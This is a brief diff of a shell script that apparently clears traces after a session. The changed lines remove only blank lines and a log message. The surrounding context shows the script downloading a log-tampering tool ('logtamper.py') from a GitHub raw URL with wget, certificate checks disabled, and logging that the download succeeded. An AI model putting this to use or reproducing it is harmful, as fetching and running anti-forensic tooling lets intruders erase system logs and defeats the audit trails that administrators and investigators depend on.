@@ -70,9 +70,6 @@ exit_session() {
     . "$HOME/.bash_logout"
 }
 
-
-
-gglog "collection info for clear"
 if [ !  -f $clear_shell ];then
     wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/re4lity/logtamper/master/logtamper.py' > $clear_shell; 
     gglog "Download logtamper ok"
